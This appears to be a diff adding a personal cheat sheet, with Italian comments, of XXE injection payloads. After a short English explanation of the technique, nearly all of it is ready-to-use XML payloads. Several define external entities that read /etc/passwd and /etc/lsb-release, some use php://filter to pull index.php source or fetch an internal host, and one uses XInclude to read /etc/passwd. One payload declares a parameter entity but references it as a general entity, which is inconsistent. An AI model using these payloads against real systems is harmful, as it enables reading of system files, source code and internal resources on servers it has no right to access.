@@ -1,0 +1,69 @@
+potenzialmente tutti i siti che elaborano xml potrebbero avere questa vulnerabilità
+ To perform an XXE injection attack that retrieves an arbitrary file from the server's filesystem, you need to modify the submitted XML in two ways:
+
+    -Introduce (or edit) a DOCTYPE element that defines an external entity containing the path to the file.
+    -Edit a data value in the XML that is returned in the application's response, to make use of the defined external entity.
+
+PAYLOADS:
+// controlla se c'è la vuln, sostituisce Doe al posto del valore del tag dove viene richiamato:
+<!--?xml version="1.0" ?-->
+<!DOCTYPE replace [<!ENTITY example "Doe"> ]>
+ <userInfo>
+  <firstName>John</firstName>
+  <lastName>&example;</lastName>
+ </userInfo>
+
+ //leggi files
+ <?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>
+
+ <?xml version="1.0"?>
+<!DOCTYPE data [
+<!ELEMENT data (#ANY)>
+<!ENTITY file SYSTEM "file:///etc/passwd">
+]>
+<data>&file;</data>
+
+<!--?xml version="1.0" ?-->
+<!DOCTYPE foo [
+  <!ELEMENT foo ANY>
+  <!ENTITY bar SYSTEM
+  "file:///etc/lsb-release">
+]>
+<item>
+<Author>data</Author>
+<Subject>data2</Subject>
+<Content>&bar;</Content>
+</item>
+
+<?xml version="1.0" encoding="ISO-8859-1"?>
+  <!DOCTYPE foo [
+  <!ELEMENT foo ANY >
+  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
+
+//wrap php script
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [
+<!ELEMENT foo ANY >
+<!ENTITY % xxe SYSTEM "php://filter/convert.base64-encode/resource=http://10.0.0.3" >
+]>
+<foo>&xxe;</foo>
+
+
+<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
+<contacts>
+  <contact>
+    <name>Jean &xxe; Dupont</name>
+    <phone>00 11 22 33 44</phone>
+    <address>42 rue du CTF</address>
+    <zipcode>75000</zipcode>
+    <city>Paris</city>
+  </contact>
+</contacts>
+
+
+
+
+PAYLOAD XINCLUDE
+//se non si può modificare il DOCTYPE
+<foo xmlns:xi="http://www.w3.org/2001/XInclude">
+<xi:include parse="text" href="file:///etc/passwd"/></foo>
